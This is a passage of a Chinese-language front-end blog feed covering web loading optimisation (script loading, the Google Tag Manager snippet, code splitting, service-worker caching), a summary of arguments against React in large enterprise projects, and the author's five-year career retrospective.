class="keyword">const</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">    script.<span class="property">src</span> = <span class="string">&quot;./test.min.js&quot;</span>;</span><br><span class="line">    script.<span class="title function_">addEventListener</span>(<span class="string">&quot;load&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">resolve</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">    script.<span class="title function_">addEventListener</span>(<span class="string">&quot;error&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">reject</span>(e);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(script);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">newScript</span>()</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    self.<span class="title function_">setState</span>(&#123; <span class="attr">status</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">catch</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    self.<span class="title function_">setState</span>(&#123; <span class="attr">status</span>: <span class="literal">false</span> &#125;);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>Google Tag Manager 的範例</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span> (<span class="params">a, b, c, d, e</span>) &#123;</span><br><span class="line">  a[d] = a[d] || [];</span><br><span class="line">  a[d].<span class="title function_">push</span>(&#123;</span><br><span class="line">    <span class="string">&quot;gtm.start&quot;</span>: <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>(),</span><br><span class="line">    <span class="attr">event</span>: <span class="string">&quot;gtm.js&quot;</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">var</span> f = b.<span class="title function_">getElementsByTagName</span>(c)[<span class="number">0</span>],</span><br><span class="line">    g = b.<span class="title function_">createElement</span>(c),</span><br><span class="line">    h = <span class="string">&quot;dataLayer&quot;</span> != d ? <span class="string">&quot;&amp;l=&quot;</span> + d : <span class="string">&quot;&quot;</span>;</span><br><span class="line">  g.<span class="property">async</span> = <span class="literal">true</span>;</span><br><span class="line">  g.<span class="property">src</span> = <span class="string">&quot;https://www.googletagmanager.com/gtm.js?id=&quot;</span> + e + h;</span><br><span class="line">  f.<span class="property">parentNode</span>.<span class="title function_">insertBefore</span>(g, f);</span><br><span class="line">&#125;)(<span class="variable language_">window</span>, <span class="variable language_">document</span>, <span class="string">&quot;script&quot;</span>, <span class="string">&quot;dataLayer&quot;</span>, <span class="string">&quot;GTM-XXXXXXX&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="程式拆分-Code-Splitting"><a href="#程式拆分-Code-Splitting" class="headerlink" title="程式拆分 (Code Splitting)"></a>程式拆分 (Code Splitting)</h3><p>JavaScript 在早期伺服器渲染的階段，檔案較小且大多只有擔任簡單的事件互動，可以說幾乎沒有優化的需求，近幾年 Node.js 的快速發展加上 SPA 的概念出現後，才開始慢慢出現比較大且複雜的腳本。</p><p>當腳本複雜化後就開始有了 module 的概念，方便在撰寫的時候重複組合使用，在 JavaScript 中的 module 有很多種載入方式，像是早期的 CommonJS 或 AMD-based 的 RequireJS 或是都支援的 UMD，再來就是用 Webpack 搭配 Babel 直接用 ES6 的寫法。</p><p>Webpack 這類的工具起初的目標是幫我們把拆分的 module 做好打包，方便我們用 bundle 後的檔案進行發佈，當腳本開始變多時就會有越來越多當下不需要但又會被載入的部分，隨後應運而生的就是 code splitting 的概念。</p><ul><li><a href="https://webpack.js.org/guides/code-splitting/">https://webpack.js.org/guides/code-splitting/</a></li><li><a href="https://reactjs.org/docs/code-splitting.html">https://reactjs.org/docs/code-splitting.html</a></li></ul><p>Code splitting 如何去優化網站的載入效能?<br>因為腳本執行與樣式渲染都會影響網站的載入，原則上就是透過是當的分類拆分，透過 lazyload 的概念來達到優化的目的。Code splitting 能夠做到的應用場景如下:</p><ol><li>按照路由切分在特定頁面只載入相關的腳本與樣式檔，譬如在個人資料頁面就不載入商品或是行銷活動頁面相關程式碼。</li><li>常用的第三方套件被放在某個 <code>common.chunk.js</code> 中，這樣瀏覽器就能夠進行快取，這樣即使要看到新版的應用，也不一定要重新下載這個部分。</li><li>CSS-in-JS 的方案讓樣式檔可以跟著元件一起載入，或是盡量使用原子化設計的撰寫方式，並且把相關的樣式都放在 <code>common.css</code> 中讓瀏覽器進行快取。</li></ol><p>會有 code splitting 另一方面也是 HTTP2 出現之後的影響，針對同一個網域可以平行處理資源，但值得注意的是經網路上的大大測試同時很多小檔也不一定比一個大檔案快，所以其實是要嘗試出一個中間值。</p><ul><li><a href="https://www.digitalocean.com/community/tutorials/http-1-1-vs-http-2-what-s-the-difference">https://www.digitalocean.com/community/tutorials/http-1-1-vs-http-2-what-s-the-difference</a></li><li><a href="https://factoryhr.medium.com/http-2-the-difference-between-http-1-1-benefits-and-how-to-use-it-38094fa0e95b">https://factoryhr.medium.com/http-2-the-difference-between-http-1-1-benefits-and-how-to-use-it-38094fa0e95b</a></li><li><a href="https://medium.com/@asyncmax/the-right-way-to-bundle-your-assets-for-faster-sites-over-http-2-437c37efe3ff">https://medium.com/@asyncmax/the-right-way-to-bundle-your-assets-for-faster-sites-over-http-2-437c37efe3ff</a></li></ul><h3 id="打包檔分析器-Bundle-Analyzer"><a href="#打包檔分析器-Bundle-Analyzer" class="headerlink" title="打包檔分析器 (Bundle Analyzer)"></a>打包檔分析器 (Bundle Analyzer)</h3><p>在使用的套件越來越多的情況底下，其實延遲載入、程式拆分的做法改善也有限，有時候其實很難發覺到底是哪個套件對專案影響最大，這時候就可以使用<a href="https://create-react-app.dev/docs/analyzing-the-bundle-size/">打包檔分析器</a>來找看看兇手是誰，解決的方式也許是看看</p><ol><li>import 的時候使用 partial import 的方式而不是直接全部引入 (<code>import has from &#39;lodash/has&#39;;</code><br>vs <code>import &#123; has &#125; from &#39;lodash&#39;;</code>)，這個部分跟 code splitting 其實是類似的概念</li><li>找替代方案，像是 moment.js 就屬於大包的套件，就有 day.js 或是 date-fns 這類相對小包的套件可作替代</li></ol><p>範例頁面可以看這裡:<br><a href="https://cdn.rawgit.com/danvk/source-map-explorer/08b0e130cb9345f9061760bf8a8d9136ea60b457/demo.html">https://cdn.rawgit.com/danvk/source-map-explorer/08b0e130cb9345f9061760bf8a8d9136ea60b457/demo.html</a></p><h3 id="資源優化-Resource-Optimization"><a href="#資源優化-Resource-Optimization" class="headerlink" title="資源優化 (Resource Optimization)"></a>資源優化 (Resource Optimization)</h3><ol><li>透過撰寫 serviceWorker 來實作 PWA 靜態資源快取</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">self.<span class="title function_">addEventListener</span>(<span class="string">&quot;install&quot;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  event.<span class="title function_">waitUntil</span>(</span><br><span class="line">    caches.<span class="title function_">open</span>(cacheName).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">cache</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> cache.<span class="title function_">addAll</span>([</span><br><span class="line">        <span class="string">&quot;/css/bootstrap.css&quot;</span>,</span><br><span class="line">        <span class="string">&quot;/css/main.css&quot;</span>,</span><br><span class="line">        <span class="string">&quot;/js/bootstrap.min.js&quot;</span>,</span><br><span class="line">        <span class="string">&quot;/js/jquery.min.js&quot;</span>,</span><br><span class="line">        <span class="string">&quot;/offline.html&quot;</span>,</span><br><span class="line">      ]);</span><br><span class="line">    &#125;)</span><br><span class="line">  );</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ol start="2"><li>資料面的快取</li></ol><ul><li>API 快取: <a href="https://github.com/RasCarlito/axios-cache-adapter">https://github.com/RasCarlito/axios-cache-adapter</a></li><li>Redux 快取: <a href="https://github.com/rt2zz/redux-persist">https://github.com/rt2zz/redux-persist</a></li></ul><ol start="3"><li>靜態圖片資源進行無損壓縮</li></ol><ul><li><a href="https://tinypng.com/">https://tinypng.com/</a></li></ul><ol start="4"><li>Responsive Images</li></ol><ul><li><a href="https://developer.mozilla.org/en-US/docs/Learn/HTML/Multimedia_and_embedding/Responsive_images">https://developer.mozilla.org/en-US/docs/Learn/HTML/Multimedia_and_embedding/Responsive_images</a></li></ul><h2 id="網站速度測試工具"><a href="#網站速度測試工具" class="headerlink" title="網站速度測試工具"></a>網站速度測試工具</h2><p>Google 提供了底下兩套免費的工具 <a href="https://developers.google.com/speed/pagespeed/insights/?hl=zh-TW">PageSpeed Insights</a> 較適合非開發者使用會是用真實環境去測試，Chrome Lighthouse 則比較適合前端工程師本地端測試使用。</p><blockquote><p>PageSpeed Insights<br><img src="/2021/03/09/experience-sharing-web-page-loading-performance/experience-sharing-web-page-loading-performance.png" alt="PageSpeed Insights"></p></blockquote><blockquote><p>Chrome Lighthouse<br><img src="/2021/03/09/experience-sharing-web-page-loading-performance/chrome-lighthouse.png" alt="Chrome Lighthouse"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Frontend </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不在大型專案導入 React.js 的 5 個原因</title>
      <link href="/2021/02/28/react-in-enterprise-app/"/>
      <url>/2021/02/28/react-in-enterprise-app/</url>
      
        <content type="html"><![CDATA[<h2 id="不在大型專案導入-React-js-的-5-個原因"><a href="#不在大型專案導入-React-js-的-5-個原因" class="headerlink" title="不在大型專案導入 React.js 的 5 個原因"></a>不在大型專案導入 React.js 的 5 個原因</h2><p>這篇文章會分享 5 個不建議在大型專案導入 React.js 的原因，主要內容皆從底下這篇文章翻譯而來，筆者的公司需要維護大型的專案，且部分情況需要和外包的工程師協作，專案開發的大致情境和背景:</p><ul><li>220 個頁面，大概有 20% 需要高度客製化</li><li>需要顯示大量客製化的表格欄位類的資料</li><li>專案需同時讓多個團隊同時一起維護</li><li>會是進行多年的專案，且會一直加入新功能</li><li>不需要支援離線使用</li><li>公司較多 .NET 開發者</li></ul><blockquote><p><a href="https://betterprogramming.pub/i-almost-got-fired-for-choosing-react-in-our-enterprise-app-846ea840841c"><code>I almost got fired for choosing react in our enterprise-app.</code></a></p></blockquote><p>接下來就來看看作者提出大型專案不該使用 React 作為技術選型的五個原因。</p><h3 id="專案需要和-Net-或是-Java-背景的開發者或外包廠商合作"><a href="#專案需要和-Net-或是-Java-背景的開發者或外包廠商合作" class="headerlink" title="專案需要和 .Net 或是 Java 背景的開發者或外包廠商合作"></a>專案需要和 <code>.Net</code> 或是 <code>Java</code> 背景的開發者或外包廠商合作</h3><p>可能會被問到底下幾個問題</p><ul><li>相依性注入要怎麼寫? 我可以使用 <a href="https://github.com/inversify/InversifyJS">InversifyJS</a> 嗎?</li><li><code>Functional Component</code> 真的有比較好嗎? 我們還是寫 <code>Class Component</code> 吧</li><li>為什麼很多 function 沒有宣告成 static 封裝在 class 中</li><li>打 API Retry 的機制為何? 是否考慮用 PollyJS 來實作?</li><li>要怎麼使用 Visual Studio 把程式跑起來?</li></ul><p>顯然在合作上，開發者會更傾向用原來已知的想法來學習和專案開發，像是 <code>.Net</code> 或 <code>Java</code> 的指導方針或是設計模式來寫 React，對於熟悉過去寫法的工程團隊來說，Angular 相對 React 也許會更適合當作大專案的團隊合作框架。</p><h3 id="選了-react-js-後，需要花時間選擇更多第三方套件"><a href="#選了-react-js-後，需要花時間選擇更多第三方套件" class="headerlink" title="選了 react.js 後，需要花時間選擇更多第三方套件"></a>選了 react.js 後，需要花時間選擇更多第三方套件</h3><p>因為 React 只是一個 lib 所以完整的專案就需要更多第三方套件，對團隊來說，從評估到使用的討論過程也會是開發成本。會遇到的問題像是:</p><ul><li>要使用哪種路由?</li><li>Redux 的非同步副作用要怎麼處理? thunk? saga? observable?</li><li>打 API 要怎麼實作? Axios? Fetch?</li><li>表單處理要用哪套? Redux-Forms? Formiq? Final-Form?</li><li>CSS in JS 還是直接寫 SASS?</li><li>i18n 的套件要使用哪套?</li></ul><p>對團隊來說，引入或是拿掉函式庫都需要討論，需要去研究列出優缺點，確定對專案的影響範圍，至少，函式庫都要先玩過基本的功能。</p><p>也因為都是各團隊分開討論的關係，所以在大公司中，很可能不同團隊的專案會因為引入的函式庫而有非常不同的架構，也代表著換個專案就需要重新去學習。</p><h3 id="React-進化快速，新寫法-hooks-後發先至開始主導市場"><a href="#React-進化快速，新寫法-hooks-後發先至開始主導市場" class="headerlink" title="React 進化快速，新寫法 (hooks) 後發先至開始主導市場"></a>React 進化快速，新寫法 (hooks) 後發先至開始主導市場</h3><p>當專案開發到一半後，新的寫法卻明顯優於舊的寫法，於是工程師們就開始導入，所以就會出現同樣一種專案中混和兩種以上解決方案的狀態。改用新寫法後，另外一個問題就是新的寫法能夠和我們引用的第三分套件和諧的共處嗎?</p><p>舉例來說 <code>react-redux</code> 提供了更方便的 hook 就會造成原來的寫法和定義都不再適用? 不再去使用 connect 和嚴格的區分 container 和 component。</p><p>能確定下一個新寫法什麼時候出來嗎?</p><h3 id="後期開發流程速度下降"><a href="#後期開發流程速度下降" class="headerlink" title="後期開發流程速度下降"></a>後期開發流程速度下降</h3><p>當引入的套件越來越多，CI&#x2F;CD 的速度也會越來越久，需要用到的硬碟空間也會越來越大。</p><p>因為 React 只是一個 lib，會引入越來越多第三方套件是正常的，問題發生點在於每個第三方套件各自引入的相依性套件又不太相同，會導致最後 <code>\node_modules</code> 資料夾肥大。</p><h3 id="引入-Redux-Saga-這類工具反而讓專案更糟糕"><a href="#引入-Redux-Saga-這類工具反而讓專案更糟糕" class="headerlink" title="引入 Redux-Saga 這類工具反而讓專案更糟糕?"></a>引入 Redux-Saga 這類工具反而讓專案更糟糕?</h3><ul><li>增加專案複雜度</li><li>當為了安全性、效能需要升級，但新的寫法出現速度很快，容易有升級上的成本</li><li>React 的優點是簡單、彈性高且有豐富的生態系，卻也因為快速發展讓生態系出現了維護上的問題</li><li>React 能夠向下相容，但較複雜的第三方函式庫卻可能無法</li></ul><p>引入了一套穿透性高的工具後，會遇到的問題就是對陳年老專案來說就需要打掉重練，各位還記得 Flux 的 <a href="http://alt.js.org/">Alt</a> 嗎?</p><ul><li>為什麼只是套件升級要這麼花時間? (相容性問題)</li><li>為什麼開發效率越來越低? (因為要多花時間研究舊的套件，eg: <a href="http://alt.js.org/">Alt</a>)</li><li>為什麼 bug 越來越多，穩定性越來越低?</li></ul><h2 id="結論與經驗分享"><a href="#結論與經驗分享" class="headerlink" title="結論與經驗分享"></a>結論與經驗分享</h2><p>筆者這篇文章大多說的蠻中肯的，不過有些問題其實不完全跟 React.js 相關，早期在開發前端 SDK 的時候，前一個同事就是用寫 Java 的概念在寫 JavaScript，可以把 100 行能完成的寫法寫成 300 行，印象中那時候可以看到建立很多基本的 <code>class</code> 然後繼承又繼承後才變成可以用的功能。</p><p>小編之前有看過一個概念叫 <code>YAGNI: You Ain&#39;t Gonna Need It.</code> 在決定專案架構前，覺得可以問幾個問題:</p><ul><li>真的需要使用 XX 模式嗎？</li><li>真的需要拆分成小元件嗎？</li><li>真的需要切成一堆小介面和抽象類別嗎？</li></ul><p>在選擇 React 需要花時間選擇其他第三分套件的部份這的確是個成本，而且開源世界中很可能在某個階段作者說不維護就不維護這也是個風險。</p><p>過去我也曾看過團隊溝通協作可能不順暢的專案，在專案中類似功能都會有兩至三種以上的解決方案或寫法，這也確實造成了後續接手的我在開發流程速度下降的問題，因為在看程式碼的時候會充滿各種疑惑，更需要額外時間進行特定版本的函式庫寫法研究和考古，是到很後來才知道這是當時是把三個組的開發結果合併在一起的專案，也難怪充滿著許多前人的驕傲與不同的堅持。</p><p>關於引入過多的套件，我會覺得這倒是跟 react 無關，不過小編其實也曾經看過一個專案裡面共存 <code>redux-observable</code> 和 <code>redux-orm</code>，然而仔細看了一下需求，就可以感受到當時工程師想要嘗試新事物的心，但對後來的我大概只剩下賭爛，而 CI&#x2F;CD 和本機開發速度也確實因為各種不同的套件引入受到影響，當時也因為筆電常常風扇快要崩潰的聲音所以整理函式庫，作法上就是能 CDN 的先 CDN，同樣功能不同套件不同寫法的想辦法整合，印象中 CI&#x2F;CD 最後至少有少 30 秒。</p><blockquote><p>YAGNI: 炫技跟過度結構化並不會讓專案變得更健康</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> React.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> React.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>回顧成為前端工程師的這五年</title>
      <link href="/2021/01/26/thinking-retrospective-me/"/>
      <url>/2021/01/26/thinking-retrospective-me/</url>
      
        <content type="html"><![CDATA[<p>嗨, 我是林彥成，網站前後端開發經驗六年，一開始是後端工程師，目前專注在 React.js、 Next.js 相關技術及應用上，後端能使用 Node.js、Socket.IO 做 API 開發和即時資料交換。</p><blockquote><p>學習過程中，覺得知識可以被更淺顯的表達，於是就開始了寫部落格的旅程，前端三分鐘。</p></blockquote><ul><li>待過幾間新創公司常處理從零到一的環境建置</li><li>會用 Jenkins、Gitlab CI 建立持續整合流程來降低錯誤發生</li><li>測試工具上使用 Jest 和 Cypress 來協助開發</li><li>商業相關透過導入 Google Analytics、短網址工具協助網站流量分析</li></ul><p>工作幾年下來，還是想達到的目標:</p><ul><li>想成為能在世界各地工作的人，選擇投入高移動性的網路產業</li><li>想用合理的工時工作，認為讀書和工作只是幫助我們更接近喜歡的自己</li><li>想成為一個對社會有好的影響的人，最喜歡的一句話是聰明是天賦，而善良是種選擇</li></ul><h2 id="前端工程師是什麼"><a href="#前端工程師是什麼" class="headerlink" title="前端工程師是什麼?"></a>前端工程師是什麼?</h2><p>前端工程師普遍認知中是撰寫網站的工程師，隨著近幾年瀏覽器技術的演進，前端能做到的事情也越來越多，所需要的知識與技能也就越來越複雜，也才出現了專職的前端職位。</p><p>舉例來說近幾年 PWA 的加速發展也造就了越來越多的應用出現，透過<a href="/2021/09/02/pwa-progressive-web-app-introduction/?utm_source=link&utm_medium=article&utm_campaign=internal_link">漸進式增強</a>讓網站功能越來越豐富。</p><h2 id="為什麼選擇成為前端工程師"><a href="#為什麼選擇成為前端工程師" class="headerlink" title="為什麼選擇成為前端工程師"></a>為什麼選擇成為前端工程師</h2><p>我是一個前端工程師，選擇網路業的原因有四點：</p><ol><li>工作後發現想追上十年 Java 經驗的主管有難度</li><li>瀏覽器、框架起飛中，如果跟主管一起學輸贏就不一定</li><li>想成為能在世界各地工作的人，不想被產業和公司綁架</li><li>想用合理的工時工作，高薪產業是 IC 設計、半導體，但不夠強大不會有地點和時間上的選擇</li></ol><p>網路業發展快速，每年都有新技能可以學習，舉例來說像前端、Cloud、DevOps 相關都是近年才有專門職缺。</p><p>工作上解決的問題通常都是讓一個 Web App 的功能從無到有到可以正常運行，算是很有創造性也多元的工作也很有趣，工作六年至今扣掉趕行銷活動頁都還蠻喜歡的。</p><blockquote><p>選擇比努力重要</p></blockquote><p>我的個性上屬於外向型的內向人，從小到大都明確知道合作上有做不好的地方，大多喜歡獨立作業也相信溝通成本會讓個人產能下降。感覺不爽時通常只會把該吃的東西吃下去就準備找下個工作，後來被好同事影響，發現慢慢練習把 PR、相關文件寫好並透過辦讀書會分享也是個很舒服的方式。</p><p>那覺得自己做得好的部分是時間充裕的情況下，相關專案文件都寫得還算詳細，每次離職都至少交個 10 幾頁甚至幾十頁文件，文件通常包含需了解的基本知識、參考的資料來源導讀、怎麼讓專案跑起來、常見問題、權限和相關帳號密碼位置，這些其實平常會寫讀書會也會分享，花同樣一份文件的時間卻可以用在多種場合，超棒。</p><p>最喜歡的工作經驗是在學習上能有同儕刺激的時候，曾體驗過工作很討厭也與價值觀衝突，但同事給我的刺激和成長仍舊讓我很有成就感，所以未來如果只能選一種工作，會希望選擇能夠持續成長的工作。舉例來說去年在公司我就辦了六次的讀書會:</p><ul><li>如何協助專案導入 CI、CD 流程</li><li><a href="/2020/05/27/css-atomic-css/?utm_source=link&utm_medium=article&utm_campaign=internal_link">原子化概念在專案上的幫助</a></li><li><a href="/2020/07/08/thinking-refactor-and-code-quaility/?utm_source=link&utm_medium=article&utm_campaign=internal_link">重構專案過程分享</a></li><li><a href="/2020/12/03/experience-sharing-growth-hacker-seminar-2020/?utm_source=link&utm_medium=article&utm_campaign=internal_link">成長駭客年會心得分享</a></li><li><a href="/2021/01/11/experience-sharing-agile-tour-2020/?utm_source=link&utm_medium=article&utm_campaign=internal_link">Aglie Tour 2020 心得分享</a></li><li>專案上線前回顧，談工程師為什麼會想離職</li></ul><h2 id="前端工程師職場情況分析"><a href="#前端工程師職場情況分析" class="headerlink" title="前端工程師職場情況分析"></a>前端工程師職場情況分析</h2><p>工作和職涯發展上，專案和公司的成長可以看成是一個平均值，正常來說普通人只要稍微努力一些，經過兩年的努力絕對是超過平均很多的。</p><p>至於為什麼可以透過加速換工作的週期來加速成長，也是因為持續的去了解市場行情，明確知道有空間，知道很大的機率都會比較好，事後檢核實際上也是如此，之前會從以下管道了解:</p><ul><li><a href="https://github.com/f2etw/jobs/issues">f2etw&#x2F;jobs</a></li><li>MIT Job、cakeresume、yourator</li><li><a href="https://www.facebook.com/groups/f2e.tw">FB 前端社群</a></li><li><a href="https://docs.google.com/spreadsheets/d/1zVe__kJ5hkpqZcC-364E5YQP2iVRLfBhcbYuxHjEtVU/edit?usp=sharing">統計的表單</a></li></ul><blockquote><p>前端工程師薪資匿名大調查分配圖 2016<br><img src="/2021/01/26/thinking-retrospective-me/FrontEndSalary2016.png" alt="FrontEndSalary2016"></p></blockquote><blockquote><p>前端工程師薪資匿名大調查數據<br><img src="/2021/01/26/thinking-retrospective-me/FrontEndSalaryTable2016.png" alt="FrontEndSalaryTable2016"></p></blockquote><p>最近有感薪水快到一般公司的頂，這一兩年如果努力方向不轉換也沒有加倍努力，接下來幾年薪水變化應該不會太大，所以開始主動找很多厲害的前輩請教，得到的答案通常會是要開始練習也讓其他人能做的跟你一樣好。</p><blockquote><p>開始會想看看除了靠自己看到的風景以外，跟其他人一起還能走到什麼樣的地方</p></blockquote><p>過去懶得引導時往往會直接給答案，給答案相對簡單節省時間也可以讓新手感覺良好，所以當有一天發現，明明這個人可以直接給你答案卻願意好好引導時，真的要好好感謝和珍惜。</p><h2 id="前端工程師的工時正常嗎"><a href="#前端工程師的工時正常嗎" class="headerlink" title="前端工程師的工時正常嗎?"></a>前端工程師的工時正常嗎?</h2><p>這個問題反過來問自己，就是我們該怎麼樣用合理的工時去工作。</p><p>工作這幾年下來，工時正常相對大學來說可以說是非常爽，比起學生時代時間多了錢也多了時間，而且只要做好一門專業的事情，但在還沒有足夠實務工作、面試經驗前，我也是苦命過的:</p><ul><li>公關公司打工: 行政助理工時 9-20 午休 1，晚上沒休息沒晚餐，但公司只有我有加班費</li><li>園區: 出差待過 war room，東西趕上線時助理會敲門送餐，7-22 連吃飯都不用離開</li><li>網路業: 趕行銷活動有次沒吃晚餐只吃可樂果</li></ul><p>關於在各地工作的實驗，這幾年下來在竹北、新竹、台南、台北都工作過，待過的企業類型有中小企業、新創、內部新創、上市櫃公司。</p><p>網路業在工時安排上都很彈性自由，至今除了一間奇妙的公司外，工作上手後都沒有主管、同事質疑和過問工作進度。</p><p>在有了實務經驗後，其實蠻容易找到正常工時薪水也可以接受的公司，就算是科學園區相信也是有少數不加班的職缺，所以我認為</p><blockquote><p>發著普通薪水卻又會讓員工一直加班的公司通常是因為無能的管理跟規劃</p></blockquote><ul><li>上市櫃公司: 外部案子、內部研發都會碰到有歷史的專案，工時普遍正常，各種流程有重重阻礙</li><li>中小企業: 穩定賺錢的企業，一週的工作通常四天可以做完，各種事情時程也同樣都較長</li><li>內部新創: 短期沒有賺錢壓力就是做到大老闆滿意，中間人沒處理好會淪為隕石開發，步調、工時都非常自由</li><li>新創: 容易營收優先，需要效率、速度的反應部隊，常用技能為敏 (加) 捷 (班) 開發，商業模式若不穩定可能需要接案，號稱自由但幾乎都被迫超工時，而且可能你在水深火熱，但其他同事卻在旁邊你是員外我是蝶員外快來抓蝴蝶，不亦樂乎</li></ul><p>體驗過這麼多類型的公司後，可以跟大家說，請相信公司養的每個人、每個職缺在世界上都還是有存在的意義，最重要的還是在於生活怎麼過，而怎麼過是我們可以選擇的。</p><p>這五年多下來，當然也練就了用更少的時間做更多事的技能，接下來的目標就是好好累積身份資本，同時也要更認真經營 <a href="https://www.linkedin.com/in/LinYenCheng">LinkedIn</a>、<a href="https://linyencheng.github.io/">我的前端三分鐘部落格</a>，盡可能增加在人力市場上的曝光度，來增加遇到好工作的機會。</p><h2 id="前端工程師學習地圖"><a href="#前端工程師學習地圖" class="headerlink" title="前端工程師學習地圖"></a>前端工程師學習地圖</h2><p>一個網頁主要由以下三個要素組成，學習路線推薦是依照底下順序</p><ul><li>HTML: 提供很多網站會使用的預設的元素，只需要透過標籤就可以建立使用</li><li>CSS: 將預設的樣式改成喜歡的樣子</li><li>JavaScript: 增加網站的互動</li></ul><h3 id="HTML-學習地圖"><a href="#HTML-學習地圖" class="headerlink" title="HTML 學習地圖"></a>HTML 學習地圖</h3><p>這裡推薦 <a href="https://developer.mozilla.org/zh-TW/docs/Web/HTML/Element">MDN 的學習資源</a>，了解順序建議如下:</p><ul><li>理解所有 HTML 元素的用途</li><li>學習使用<a href="https://developer.mozilla.org/zh-TW/docs/Learn/Forms">表單</a>及預設驗證功能</li><li>HTML 語意化 (Semantic HTML)</li></ul><h3 id="CSS-學習地圖"><a href="#CSS-學習地圖" class="headerlink" title="CSS 學習地圖"></a>CSS 學習地圖</h3><p>CSS 除了基礎知識外，學習和應用的方式較多也複雜</p><ul><li>CSS 基礎用法<ul><li>CSS Grid</li><li>Flexbox</li><li>CSS 變數</li></ul></li><li>CSS 框架<ul><li>Bootstrap</li><li>Tailwind CSS</li></ul></li><li>CSS 處理器<ul><li>Sass</li><li>PostCSS</li></ul></li><li>CSS in JS<ul><li>CSS Modules</li><li>Styled Components</li></ul></li><li>Responsive Design<ul><li>CSS Media Queries</li><li>Viewport</li><li>rem</li></ul></li><li>CSS 動畫<ul><li>原生的寫法，但建議可以學習使用<a href="https://animate.style/">工具包</a></li><li>GSAP</li><li>anime.js</li></ul></li></ul><h3 id="JavaScript-學習地圖"><a href="#JavaScript-學習地圖" class="headerlink" title="JavaScript 學習地圖"></a>JavaScript 學習地圖</h3><p>JavaScript 畢竟還是程式語言，在學習上算是最困難的一個學習上要從基礎知識、工具使用、框架選擇三個方面著手。</p><ul><li>JavaScript 基本語法</li><li>JSON 資料格式</li><li>ES6&#x2F;ES7 近年的新語法</li><li>TypeScript</li><li>Fetch API</li></ul><p>使用工具協助開發</p><ul><li>Axios</li><li>ESLint</li><li>VS Code Extensions</li><li>npm scripts</li><li>Version Control Systems (Git)</li></ul><p>前端御三家</p><ul><li>React</li><li>Angular</li><li>Vue</li></ul><h2 id="在學校的時候最喜歡什麼"><a href="#在學校的時候最喜歡什麼" class="headerlink" title="在學校的時候最喜歡什麼?"></a>在學校的時候最喜歡什麼?</h2><blockquote><p>懷疑了工科系五年半，更懷疑的其實是自己能夠做好什麼</p></blockquote><p>大學畢業於成大工程科學系，100 級畢業的工科系是還沒砍學分的滿滿 146，是一個什麼都上一些，實際上都是在當考古學家的一個系。</p><p>大學四年除了讀到懷疑人生，好像在學習上也就只剩一疊考古題 QQ 不過後來不小心手滑修了 176 才畢業，也提早結束了部分碩士班課程。</p><p><img src="/2021/01/26/thinking-retrospective-me/ncku.jpg" alt="NCKU"></p><p>在工科所選了資訊組，從學長那學會了嵌入式、Android App 開發、還有為了碩士論文自學了網頁，主要學會了研究方法、寫了全英文的碩士論文，但寫程式上仍舊缺乏練習，屬於菜鳥中的菜鳥，開始質疑到底自己可以做些什麼。</p><ul><li>曾經想要當導遊，在三年的導覽志工服務結束後，發現長期下來並不那麼有趣。</li><li>曾經想要當老師，當了志工老師也通過教程門檻，發現工科系不太適合當體制內的老師。</li><li>曾經不想讀書，因為被培養成考試機器很無聊，開始認真參加社團，後來也大量嘗試外系課程。</li><li>曾經不想升學，體驗做專題、先修研究所、參加生涯教練計畫和娃哈哈機電所的暑期實習。</li><li>曾經不想當血汗工程師，但發現其實可以不血汗只要玩電腦也可以賺錢。</li><li>曾經不想簽研替，到台東體驗一年打工度假，雖然荒唐不少，但回頭來看也是美好回憶。</li></ul><p>值得慶幸的是過去做了不少的嘗試，靠北歸靠北還是真心感謝成大帶給我的一切。</p><p>事後來看，能讀綜合大學真的是最棒的事情，因為可以遇到很多樣科系的老師、同學擁有無限的發展可能，而且通常只要是外系的課通常我都上的很開心，因為沒有分數跟考試必過的壓力，真的有被當掉的也只有證券交易法。</p><h2 id="希望做像是哪些人的工作"><a href="#希望做像是哪些人的工作" class="headerlink" 